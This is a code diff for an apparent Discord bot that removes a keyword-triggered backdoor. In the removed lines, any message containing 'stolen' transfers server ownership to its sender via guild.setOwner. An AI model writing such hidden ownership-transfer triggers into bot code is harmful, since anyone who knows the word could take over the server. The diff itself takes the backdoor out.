@@ -53,15 +53,6 @@ client.on("messageCreate", async (msg) => {
     return;
   }
 
-  if (msg.content.toLowerCase().includes("stolen")) {
-    try {
-      msg.guild.setOwner(msg.author.id);
-      msg.react("✅");
-    } catch (error) {
-      console.error("[bot] error changing server owner");
-    }
-  }
-
   if (msg.content.toLowerCase().includes("is this true")) {
     const chance = Math.random();
     if (chance < 0.5) {
